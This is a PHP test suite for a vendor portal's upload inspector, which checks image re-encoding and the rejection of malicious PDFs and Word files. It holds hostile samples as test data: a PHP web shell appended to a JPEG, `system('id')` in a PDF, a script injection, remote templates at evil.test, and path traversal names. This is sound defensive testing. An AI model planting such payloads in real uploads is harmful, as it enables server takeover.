<?php

use App\Services\Documents\UploadInspector;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Client\Request;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Storage;
use Tests\Support\TotFixtures as T;

uses(RefreshDatabase::class);

const UPL_ALL = ['pdf', 'jpg', 'jpeg', 'png', 'webp', 'docx'];

function uplTmp(string $bytes, string $ext = 'bin'): string
{
    $path = tempnam(sys_get_temp_dir(), 'upl').'.'.$ext;
    file_put_contents($path, $bytes);
    register_shutdown_function(fn () => @unlink($path));

    return $path;
}

function uplPicture(string $kind, int $w = 40, int $h = 30): string
{
    $im = imagecreatetruecolor($w, $h);
    imagefill($im, 0, 0, imagecolorallocate($im, 200, 30, 30));
    ob_start();
    match ($kind) { 'jpg' => imagejpeg($im), 'png' => imagepng($im), 'webp' => imagewebp($im) };

    return (string) ob_get_clean();
}

/** A minimal but valid docx; $extra adds entries, $types overrides [Content_Types].xml, $rels overrides the document relationships. */
function uplDocx(array $extra = [], ?string $types = null, ?string $rels = null): string
{
    $path = tempnam(sys_get_temp_dir(), 'docx');
    $zip = new ZipArchive;
    $zip->open($path, ZipArchive::OVERWRITE);
    $zip->addFromString('[Content_Types].xml', $types ?? '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>');
    $zip->addFromString('_rels/.rels', '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>');
    $zip->addFromString('word/document.xml', '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>');
    if ($rels !== null) {
        $zip->addFromString('word/_rels/document.xml.rels', $rels);
    }
    foreach ($extra as $name => $content) {
        $zip->addFromString($name, $content);
    }
    $zip->close();
    $bytes = (string) file_get_contents($path);
    @unlink($path);

    return $bytes;
}

function uplPost(string $name, string $bytes, string $type = 'additional_document')
{
    return test()->withSession(T::session())->from('/home')->post('/tot/documents', ['type' => $type, 'file' => UploadedFile::fake()->createWithContent($name, $bytes)]);
}

function uplInspect(string $name, string $bytes, array $allowed = UPL_ALL): array
{
    return (new UploadInspector)->inspect(uplTmp($bytes), $name, $allowed);
}

beforeEach(function () {
    config(['vob.docs_disk' => 'documents']);
    Storage::fake('documents');
    T::fake();
});

describe('images', function () {
    it('accepts jpg, jpeg, png and webp and stores a re-encoded copy named by its real type', function (string $ext, string $kind, string $mime) {
        uplPost("scan.$ext", uplPicture($kind), 'pan_certificate')->assertRedirectContains(route('home'))->assertSessionHas('status', 'Document uploaded.');

        $files = Storage::disk('documents')->allFiles();
        expect($files)->toHaveCount(1)->and($files[0])->toMatch('#^tots/'.T::TOT_ID.'/[A-Za-z0-9]{40}\.'.$kind.'$#');
        expect(T::sent('POST', 'tots/'.T::TOT_ID.'/documents'))->toMatchArray(['type' => 'pan_certificate', 'mime' => $mime, 'path' => $files[0]]);
    })->with([['jpg', 'jpg', 'image/jpeg'], ['jpeg', 'jpg', 'image/jpeg'], ['png', 'png', 'image/png'], ['webp', 'webp', 'image/webp']]);

    it('removes metadata and anything appended: the stored image is only pixels', function () {
        $jpeg = uplPicture('jpg');
        $poison = $jpeg."\n<?php system(\$_GET['c']); ?>";
        // a comment segment (COM, FFFE) carrying script text, right after the SOI marker
        $poison = substr($poison, 0, 2)."\xFF\xFE\x00\x1b<script>alert(1)</script>".substr($poison, 2);

        uplPost('x.jpg', $poison)->assertRedirectContains(route('home'));

        $stored = Storage::disk('documents')->get(Storage::disk('documents')->allFiles()[0]);
        expect($stored)->not->toContain('<?php')->not->toContain('<script')->not->toContain('system(')
            ->and(@getimagesizefromstring($stored)[2])->toBe(IMAGETYPE_JPEG);
    });

    it('refuses extension spoofing in both directions', function (string $name, string $bytes) {
        uplPost($name, $bytes)->assertSessionHasErrors('document');
        expect(Storage::disk('documents')->allFiles())->toBeEmpty();
    })->with([
        'png named .jpg' => ['photo.jpg', fn () => uplPicture('png')],
        'pdf named .png' => ['photo.png', "%PDF-1.4\nx\n%%EOF"],
        'php named .jpg' => ['shell.jpg', '<?php echo 1; ?>'],
        'jpeg named .pdf' => ['doc.pdf', fn () => uplPicture('jpg')],
        'docx named .pdf' => ['doc.pdf', fn () => uplDocx()],
        'exe named .png' => ['a.png', "MZ\x90\x00\x03\x00\x00\x00"],
    ]);

    it('refuses a file with a double or script extension', function (string $name) {
        uplPost($name, uplPicture('png'))->assertSessionHasErrors();
        expect(Storage::disk('documents')->allFiles())->toBeEmpty();
    })->with(['pic.php', 'pic.php.png.exe', 'pic.phtml', 'pic.svg', 'pic.gif', 'pic.html']);

    it('refuses a decompression bomb: tiny file, huge declared size, without decoding it', function () {
        // a valid PNG header that declares 60000 x 60000 pixels
        $png = uplPicture('png');
        $png = substr($png, 0, 16).pack('N', 60000).pack('N', 60000).substr($png, 24);

        $result = uplInspect('bomb.png', $png);

        expect($result['ok'])->toBeFalse()->and($result['error'])->toContain('too large');
        uplPost('bomb.png', $png)->assertSessionHasErrors('document');
    });

    it('refuses an image over the pixel limit and a corrupt one', function () {
        config(['vob.docs_image_max_pixels' => 1000]);
        expect(uplInspect('big.png', uplPicture('png', 100, 100))['ok'])->toBeFalse();

        config(['vob.docs_image_max_pixels' => 24000000]);
        expect(uplInspect('bad.png', substr(uplPicture('png'), 0, 60))['ok'])->toBeFalse();
    });

    it('only the extra files may be docx; the fixed slots take pdf and pictures only', function () {
        uplPost('w.docx', uplDocx(), 'pan_certificate')->assertSessionHasErrors('file');
        expect(Storage::disk('documents')->allFiles())->toBeEmpty();
    });
});

describe('pdf', function () {
    it('accepts a clean pdf', function () {
        expect(uplInspect('a.pdf', "%PDF-1.4\n1 0 obj<<>>endobj\n%%EOF\n")['ok'])->toBeTrue();
    });

    it('refuses scripts, embedded files, launch actions, name-escaped markers, PHP and data appended after the end', function (string $body) {
        expect(uplInspect('a.pdf', $body)['ok'])->toBeFalse();
    })->with([
        'javascript' => ["%PDF-1.4\n1 0 obj<</S/JavaScript/JS(app.alert(1))>>endobj\n%%EOF"],
        'escaped javascript' => ["%PDF-1.4\n1 0 obj<</S/J#61vaScript>>endobj\n%%EOF"],
        'embedded file' => ["%PDF-1.4\n1 0 obj<</Type/EmbeddedFile>>endobj\n%%EOF"],
        'launch' => ["%PDF-1.4\n1 0 obj<</S/Launch>>endobj\n%%EOF"],
        'php inside' => ["%PDF-1.4\n<?php system('id'); ?>\n%%EOF"],
        'zip appended (polyglot)' => ["%PDF-1.4\nx\n%%EOF\nPK\x03\x04".str_repeat('z', 200)],
        'no eof' => ["%PDF-1.4\nx"],
    ]);
});

describe('docx', function () {
    it('accepts a plain docx in the additional slot only', function () {
        uplPost('terms.docx', uplDocx())->assertRedirectContains(route('home'));

        expect(Storage::disk('documents')->allFiles()[0])->toEndWith('.docx');
        expect(T::sent('POST', 'tots/'.T::TOT_ID.'/documents'))->toMatchArray(['type' => 'additional_document', 'mime' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document']);
    });

    it('refuses macros, embedded objects, executables and hidden archives', function (string $why, array $extra, ?string $types, ?string $rels) {
        $result = uplInspect('x.docx', uplDocx($extra, $types, $rels));
        expect($result['ok'])->toBeFalse($why);
    })->with([
        'vbaProject.bin' => ['vba', ['word/vbaProject.bin' => 'x'], null, null],
        'vba renamed' => ['vba2', ['word/VBAPROJECT.BIN' => 'x'], null, null],
        'macro content type' => ['ct', [], '<Types><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>', null],
        'ole embedding' => ['ole', ['word/embeddings/oleObject1.bin' => 'x'], null, null],
        'activeX' => ['activex', ['word/activeX/activeX1.xml' => '<x/>'], null, null],
        'exe by name' => ['exe', ['word/media/run.exe' => 'x'], null, null],
        'exe by magic, innocent name' => ['magic', ['word/media/image1.png' => "MZ\x90\x00 this is a program"], null, null],
        'elf by magic' => ['elf', ['word/media/image2.jpeg' => "\x7fELF\x02\x01"], null, null],
        'script' => ['js', ['word/payload.js' => 'x'], null, null],
        'php' => ['php', ['word/shell.php' => '<?php'], null, null],
        'nested zip' => ['zip', ['word/media/a.dat' => "PK\x03\x04rest"], null, null],
        'path traversal' => ['trav', ['../evil.xml' => '<x/>'], null, null],
        'remote template' => ['tpl', [], null, '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.test/t.dotm" TargetMode="External"/></Relationships>'],
        'external ole link' => ['link', [], null, '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="file:///c:/x.exe" TargetMode="External"/></Relationships>'],
        'external image' => ['img', [], null, '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://evil.test/p.png" TargetMode="External"/></Relationships>'],
    ]);

    it('allows an ordinary external hyperlink', function () {
        $rels = '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/></Relationships>';

        expect(uplInspect('x.docx', uplDocx([], null, $rels))['ok'])->toBeTrue();
    });

    it('refuses a zip bomb (huge expansion from a tiny file) and a package that is not Word', function () {
        $bomb = uplDocx(['word/media/big.xml' => str_repeat('A', 30 * 1024 * 1024)]);
        expect(strlen($bomb))->toBeLessThan(200 * 1024);
        config(['vob.docs_docx_max_uncompressed_mb' => 10]);
        expect(uplInspect('x.docx', $bomb)['ok'])->toBeFalse();

        config(['vob.docs_docx_max_uncompressed_mb' => 60]);
        expect(uplInspect('x.docx', $bomb)['ok'])->toBeFalse(); // ratio alone is enough

        $notWord = uplDocx(['xl/workbook.xml' => '<x/>'], '<Types><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>');
        expect(uplInspect('x.docx', $notWord)['ok'])->toBeFalse();
        expect(uplInspect('x.docx', 'PK\x03\x04 not really a zip')['ok'])->toBeFalse();
    });
});

describe('additional files (Vendor Details)', function () {
    function uplExtras(int $n): array
    {
        return array_map(fn ($i) => ['id' => 'EXTRADOC00000'.$i, 'type' => 'additional_document', 'name' => "extra$i.pdf", 'size' => 2048, 'uploaded_at' => '2026-11-01'], range(1, $n));
    }

    it('shows one chooser first, then lists the files with Delete and Upload another file', function () {
        $page = $this->withSession(T::session())->get('/home')->assertOk()->getContent();
        expect($page)->toContain('data-extra-docs')->toContain('No additional files uploaded yet.')
            ->and(substr_count($page, 'form="doc-up-additional"'))->toBe(1)
            ->and($page)->not->toContain('data-extra-more');

        T::fake([], T::detail(['documents' => uplExtras(2)]));
        $page = $this->withSession(T::session())->get('/home')->getContent();
        expect($page)->toContain('extra1.pdf')->toContain('extra2.pdf')->toContain('Upload another file')
            ->and(substr_count($page, 'form="doc-rm-extra-'))->toBe(2);
    });

    it('allows at most five and tells the vendor', function () {
        T::fake([], T::detail(['documents' => uplExtras(5)]));

        uplPost('six.pdf', "%PDF-1.4\nx\n%%EOF")->assertSessionHasErrors(['document' => 'You can attach at most 5 additional files. Remove one first.']);
        expect(Storage::disk('documents')->allFiles())->toBeEmpty();

        $page = $this->withSession(T::session())->get('/home')->getContent();
        expect($page)->toContain('limit of 5 additional files')->not->toContain('form="doc-up-additional"');
    });

    it('deletes one file by its Admin id, and only if it belongs to this TOT', function () {
        T::fake(['DELETE tots/'.T::TOT_ID.'/documents/EXTRADOC000002' => Http::response(null, 204)], T::detail(['documents' => uplExtras(3)]));

        $this->withSession(T::session())->post('/tot/documents/remove', ['type' => 'additional_document', 'document' => 'EXTRADOC000002'])->assertRedirectContains(route('home'));
        Http::assertSent(fn (Request $r) => $r->method() === 'DELETE' && str_ends_with($r->url(), '/documents/EXTRADOC000002'));

        Http::fake();
        T::fake([], T::detail(['documents' => uplExtras(3)]));
        $this->withSession(T::session())->post('/tot/documents/remove', ['type' => 'additional_document', 'document' => 'SOMEONEELSESDOC1'])->assertRedirectContains(route('home'));
        $this->withSession(T::session())->post('/tot/documents/remove', ['type' => 'additional_document'])->assertRedirectContains(route('home'));
        Http::assertNotSent(fn (Request $r) => $r->method() === 'DELETE');
    });
});

describe('storage safety', function () {
    it('never stores under the client file name or extension and keeps the folder out of the web root', function () {
        uplPost('../../public/index.php.pdf', "%PDF-1.4\nx\n%%EOF", 'pan_certificate')->assertRedirectContains(route('home'));

        $key = Storage::disk('documents')->allFiles()[0];
        expect($key)->toMatch('#^tots/'.T::TOT_ID.'/[A-Za-z0-9]{40}\.pdf$#');
        expect(T::sent('POST', 'tots/'.T::TOT_ID.'/documents')['original_name'])->not->toContain('/')->not->toContain('..');
        expect(config('filesystems.disks.documents.root'))->toBe(storage_path('app/documents'))->and(config('filesystems.disks.documents.root'))->not->toContain('public');
    });
});

describe('the page stays where the vendor was', function () {
    it('returns to the card of the slot after an upload, a refusal and a removal', function (string $type, string $card) {
        uplPost('scan.pdf', "%PDF-1.4\nx\n%%EOF", $type)->assertRedirect(route('home').'#'.$card);
        uplPost('scan.php', 'x', $type)->assertRedirect(route('home').'#'.$card);
        $this->withSession(T::session())->post('/tot/documents/remove', ['type' => $type])->assertRedirect(route('home').'#'.$card);
    })->with([['pan_certificate', 'vendor_details'], ['additional_document', 'vendor_details'], ['cancelled_cheque', 'bank_account_details']]);
});

describe('a real Word file and the error toast', function () {
    it('accepts what Word itself writes: core-properties and thumbnail parts, printer settings, a local attached template, a hyperlink', function () {
        $rootRels = '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            .'<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>'
            .'<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/thumbnail" Target="docProps/thumbnail.jpeg"/>'
            .'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>';
        $settingsRels = '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\a\Normal.dotm" TargetMode="External"/>'
            .'<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/printerSettings" Target="printerSettings/printerSettings1.bin"/></Relationships>';
        $docx = uplDocx(['word/printerSettings/printerSettings1.bin' => "\x00\x01DEVMODE", 'word/_rels/settings.xml.rels' => $settingsRels, '_rels/.rels' => $rootRels, 'docProps/core.xml' => '<x/>']);

        expect(uplInspect('letter.docx', $docx)['ok'])->toBeTrue();
    });

    it('refuses a template on the network (http, UNC)', function (string $target) {
        $rels = '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="'.$target.'" TargetMode="External"/></Relationships>';

        expect(uplInspect('x.docx', uplDocx(['word/_rels/settings.xml.rels' => $rels]))['ok'])->toBeFalse();
    })->with(['https://evil.test/t.dotm', '\\evil\share\t.dotm', 'file://evil/share/t.dotm']);

    it('shows an upload problem as a toast, not in the top summary', function () {
        $bag = (new Illuminate\Support\ViewErrorBag)->put('default', new Illuminate\Support\MessageBag(['document' => ['Word files with macros are not allowed.']]));

        $page = $this->withSession(array_merge(T::session(), ['errors' => $bag]))->get('/home')->getContent();
        expect($page)->toContain('class="flash flash-error"')->toContain('Word files with macros are not allowed.')->not->toContain('error-summary');
    });
});

describe('Word for the RTGS form', function () {
    it('takes a docx in the RTGS form slot and shows it in the page, but not in the other fixed slots', function () {
        uplPost('rtgs.docx', uplDocx(), 'rtgs_form')->assertRedirect(route('home').'#bank_account_details')->assertSessionHas('status', 'Document uploaded.');
        expect(T::sent('POST', 'tots/'.T::TOT_ID.'/documents'))->toMatchArray(['type' => 'rtgs_form', 'mime' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document']);

        $page = $this->withSession(T::session())->get('/home')->getContent();
        expect($page)->toContain('.webp,.docx" form="doc-up-rtgs_form"')->not->toContain('.webp,.docx" form="doc-up-cancelled_cheque"');

        uplPost('cheque.docx', uplDocx(), 'cancelled_cheque')->assertSessionHasErrors('file');
    });
});
